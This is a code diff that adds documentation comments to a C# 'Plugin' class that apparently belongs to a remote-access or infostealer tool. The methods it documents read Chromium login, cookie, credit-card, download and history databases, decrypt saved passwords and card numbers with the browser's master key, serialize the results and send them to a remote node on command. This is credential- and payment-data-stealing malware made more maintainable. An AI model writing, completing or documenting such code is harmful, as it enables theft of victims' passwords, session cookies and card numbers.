@@ -16,6 +16,17 @@ namespace Plugin
 {
     public class Main
     {
+
+        /// <summary>
+        /// Serializes a list of Chromium logins into a byte array.
+        /// </summary>
+        /// <param name="loginList">The list of Chromium logins to be serialized.</param>
+        /// <returns>A byte array containing the serialized Chromium logins.</returns>
+        /// <remarks>
+        /// This method serializes the input list of Chromium logins into a byte array using a BinaryWriter and MemoryStream.
+        /// It first writes the count of logins, then iterates through each login and writes its URL, username, and password to the binary stream.
+        /// The method then returns the resulting byte array.
+        /// </remarks>
         public static byte[] SerializeLoginList(List<Chromium.Login> loginList)
         {
             using (MemoryStream memoryStream = new MemoryStream())
@@ -32,6 +43,16 @@ namespace Plugin
             }
         }
 
+        /// <summary>
+        /// Serializes a list of Chromium cookies into a byte array.
+        /// </summary>
+        /// <param name="cookieList">The list of Chromium cookies to be serialized.</param>
+        /// <returns>A byte array containing the serialized data of the input <paramref name="cookieList"/>.</returns>
+        /// <remarks>
+        /// This method serializes the input list of Chromium cookies into a byte array using a <see cref="MemoryStream"/> and a <see cref="BinaryWriter"/>.
+        /// It writes the count of cookies followed by the host, name, path, value, and expiration date for each cookie in the list.
+        /// The serialized data is then returned as a byte array.
+        /// </remarks>
         public static byte[] SerializeCookieList(List<Chromium.Cookie> cookieList)
         {
             using (MemoryStream memoryStream = new MemoryStream())
@@ -50,6 +71,16 @@ namespace Plugin
             }
         }
 
+        /// <summary>
+        /// Serializes a list of web history items into a byte array.
+        /// </summary>
+        /// <param name="historyList">The list of web history items to be serialized.</param>
+        /// <returns>A byte array containing the serialized web history items.</returns>
+        /// <remarks>
+        /// This method serializes the input list of web history items into a byte array using the BinaryWriter and MemoryStream classes.
+        /// It first writes the count of history items, then iterates through each history item and writes its URL, title, and timestamp.
+        /// The method returns the resulting byte array.
+        /// </remarks>
         public static byte[] SerializeWebHistoryList(List<Chromium.WebHistory> historyList)
         {
             using (MemoryStream memoryStream = new MemoryStream())
@@ -66,6 +97,16 @@ namespace Plugin
             }
         }
 
+        /// <summary>
+        /// Serializes a list of Chromium downloads into a byte array.
+        /// </summary>
+        /// <param name="downloadList">The list of Chromium downloads to be serialized.</param>
+        /// <returns>A byte array containing the serialized download list.</returns>
+        /// <remarks>
+        /// This method serializes the input list of Chromium downloads into a byte array using the BinaryWriter and MemoryStream classes.
+        /// It first writes the count of downloads in the list and then iterates through each download, writing its tab URL and target path to the memory stream.
+        /// The resulting byte array represents the serialized form of the download list and is returned as the output.
+        /// </remarks>
         public static byte[] SerializeDownloadList(List<Chromium.Download> downloadList)
         {
             using (MemoryStream memoryStream = new MemoryStream())
@@ -81,7 +122,16 @@ namespace Plugin
             }
         }
 
-
+        /// <summary>
+        /// Serializes a list of credit cards into a byte array.
+        /// </summary>
+        /// <param name="creditCardList">The list of credit cards to be serialized.</param>
+        /// <returns>A byte array representing the serialized credit card list.</returns>
+        /// <remarks>
+        /// This method serializes the input list of credit cards into a byte array using the BinaryWriter and MemoryStream classes.
+        /// It writes the count of credit cards followed by the details of each credit card including name, month, year, number, and date modified.
+        /// The serialized byte array is then returned.
+        /// </remarks>
         public static byte[] SerializeCreditCardList(List<Chromium.CreditCard> creditCardList)
         {
             using (MemoryStream memoryStream = new MemoryStream())
@@ -100,6 +150,24 @@ namespace Plugin
             }
         }
 
+        /// <summary>
+        /// Asynchronously runs the specified node and performs various operations based on the received opcode.
+        /// </summary>
+        /// <param name="node">The node to be run.</param>
+        /// <exception cref="ArgumentNullException">Thrown when the <paramref name="node"/> is null.</exception>
+        /// <returns>An asynchronous task representing the operation.</returns>
+        /// <remarks>
+        /// This method sends a byte array with value 3 to indicate that it has connected to the specified <paramref name="node"/>.
+        /// It then creates a new Chromium instance and enters a loop to continuously check for incoming data from the <paramref name="node"/>.
+        /// Upon receiving data, it checks the opcode and performs different operations based on the received value:
+        /// - If the opcode is 0, it retrieves login data from the Chromium instance and serializes it into a byte array.
+        /// - If the opcode is 1, it retrieves cookie data from the Chromium instance and serializes it into a byte array.
+        /// - If the opcode is 2, it retrieves credit card data from the Chromium instance and serializes it into a byte array.
+        /// - If the opcode is 3, it retrieves download data from the Chromium instance and serializes it into a byte array.
+        /// - If the opcode is 4, it retrieves web history data from the Chromium instance and serializes it into a byte array.
+        /// If no payload is generated based on the received opcode, the method disconnects from the <paramref name="node"/> and returns.
+        /// The method continues to send the generated payload back to the <paramref name="node"/> until the connection is maintained.
+        /// </remarks>
         public async Task Run(Node node)
         {
             await node.SendAsync(new byte[] { 3 });//indicate that it has connected
@@ -201,6 +269,18 @@ namespace Plugin
         "Profile 5"
     };
 
+        /// <summary>
+        /// Retrieves the master key from the specified file path and returns it after decryption.
+        /// </summary>
+        /// <param name="path">The file path from which to retrieve the master key.</param>
+        /// <returns>The decrypted master key retrieved from the file.</returns>
+        /// <exception cref="FileNotFoundException">Thrown when the specified file does not exist.</exception>
+        /// <exception cref="KeyNotFoundException">Thrown when the 'os_crypt' key is not found in the JSON content.</exception>
+        /// <remarks>
+        /// This method reads the content of the file located at the specified <paramref name="path"/>.
+        /// It then deserializes the JSON content using a JavaScriptSerializer and retrieves the encrypted key.
+        /// The encrypted key is then decrypted using ProtectedData.Unprotect method and returned as the master key.
+        /// </remarks>
         private static byte[] GetMasterKey(string path)
         {
             if (!File.Exists(path))
@@ -225,6 +305,18 @@ namespace Plugin
             return null;
         }
 
+        /// <summary>
+        /// Decrypts the password using the provided buffer and master key.
+        /// </summary>
+        /// <param name="buffer">The buffer containing the encrypted password.</param>
+        /// <param name="masterKey">The master key used for decryption.</param>
+        /// <returns>The decrypted password as a string.</returns>
+        /// <remarks>
+        /// This method decrypts the password using the provided buffer and master key.
+        /// It initializes a GCM block cipher with an AES engine and decrypts the payload using the provided initialization vector (IV) and master key.
+        /// The decrypted password is then returned as a string.
+        /// If an exception occurs during the decryption process, null is returned.
+        /// </remarks>
         private string DecryptPassword(byte[] buffer, byte[] masterKey)
         {
             try
@@ -246,6 +338,20 @@ namespace Plugin
                 return null;
             }
         }
+
+        /// <summary>
+        /// Retrieves login data from the specified path using the provided master key for decryption.
+        /// </summary>
+        /// <param name="path">The path where the login data is stored.</param>
+        /// <param name="masterKey">The master key used for decryption.</param>
+        /// <returns>A list of Login objects containing the retrieved login data.</returns>
+        /// <remarks>
+        /// This method asynchronously retrieves login data from the specified path using the provided master key for decryption.
+        /// If the login data file does not exist at the specified path, null is returned.
+        /// The method creates a temporary copy of the login data file, reads the table "logins" using SQLiteHandler, and populates the list of Login objects with the retrieved data.
+        /// If an exception occurs during the retrieval process, null is returned.
+        /// </remarks>
+        /// <exception cref="Exception">Thrown if an error occurs during the retrieval process.</exception>
         public async Task<List<Login>> GetLoginData()
         {
             List<Login> loginList = new List<Login>();
@@ -277,6 +383,19 @@ namespace Plugin
             }
             return loginList;
         }
+
+        /// <summary>
+        /// Retrieves cookies from the specified path using the provided master key and returns a list of cookies.
+        /// </summary>
+        /// <param name="path">The path where the cookie database is located.</param>
+        /// <param name="masterKey">The master key used for decrypting the cookies.</param>
+        /// <returns>A list of cookies retrieved from the specified <paramref name="path"/> using the provided <paramref name="masterKey"/>.</returns>
+        /// <remarks>
+        /// This method asynchronously retrieves cookies from the specified <paramref name="path"/> by decrypting the cookie database using the provided <paramref name="masterKey"/>.
+        /// It then populates a list of cookies with the retrieved data and returns the list.
+        /// If the cookie database does not exist at the specified <paramref name="path"/>, or if an exception occurs during the retrieval process, null is returned.
+        /// </remarks>
+        /// <exception cref="Exception">Thrown if an error occurs during the retrieval process.</exception>
         public async Task<List<Cookie>> GetCookies()
         {
             List<Cookie> cookieList = new List<Cookie>();
@@ -307,6 +426,18 @@ namespace Plugin
             }
             return cookieList;
         }
+
+        /// <summary>
+        /// Retrieves web history from the specified path and returns a list of WebHistory objects.
+        /// </summary>
+        /// <param name="path">The path where the web history is stored.</param>
+        /// <returns>A list of WebHistory objects representing the web history from the specified path.</returns>
+        /// <remarks>
+        /// This method retrieves web history from the specified path by accessing the history database file.
+        /// It creates a temporary copy of the database file, reads the "urls" table using SQLiteHandler, and populates the history list with WebHistory objects.
+        /// If any required data is missing or if an exception occurs during the process, the method returns null.
+        /// </remarks>
+        /// <exception cref="Exception">Thrown if an error occurs during the retrieval of web history.</exception>
         public async Task<List<WebHistory>> GetWebHistory()
         {
             List<WebHistory> webHistoryList = new List<WebHistory>();
@@ -331,6 +462,21 @@ namespace Plugin
             }
             return webHistoryList;
         }
+
+        /// <summary>
+        /// Retrieves the list of downloads from the specified path.
+        /// </summary>
+        /// <param name="path">The path where the downloads are stored.</param>
+        /// <returns>A list of Download objects representing the downloaded items.</returns>
+        /// <remarks>
+        /// This method retrieves the list of downloads from the specified path by reading the downloads database file.
+        /// If the database file does not exist, the method returns null.
+        /// The method then creates a temporary copy of the database file and establishes a connection to it using SQLiteHandler.
+        /// It reads the "downloads" table from the database and populates the list of Download objects based on the retrieved data.
+        /// If any exceptions occur during this process, the method returns null.
+        /// Finally, the temporary database file is deleted before returning the list of downloads.
+        /// </remarks>
+        /// <exception cref="Exception">Thrown if any error occurs during the retrieval process.</exception>
         public async Task<List<Download>> GetDownloads()
         {
             List<Download> downloadsList = new List<Download>();
@@ -355,6 +501,20 @@ namespace Plugin
             }
             return downloadsList;
         }
+
+        /// <summary>
+        /// Retrieves credit card information from the specified path using the provided master key for decryption.
+        /// </summary>
+        /// <param name="path">The path where the credit card information is stored.</param>
+        /// <param name="masterKey">The master key used for decrypting the credit card information.</param>
+        /// <returns>A list of CreditCard objects containing the retrieved credit card information.</returns>
+        /// <remarks>
+        /// This method retrieves credit card information from the specified path by decrypting the data using the provided master key.
+        /// It first checks if the database file exists at the specified path, and if not, returns null.
+        /// It then creates a temporary copy of the database file, reads the credit card information using SQLite, decrypts the card numbers using the master key, and populates a list of CreditCard objects with the retrieved information.
+        /// If any exception occurs during the process, the method returns null.
+        /// </remarks>
+        /// <exception cref="Exception">Thrown if any error occurs during the retrieval and decryption of credit card information.</exception>
         public async Task<List<CreditCard>> GetCreditCards()
         {
             List<CreditCard> creditCardsList = new List<CreditCard>();
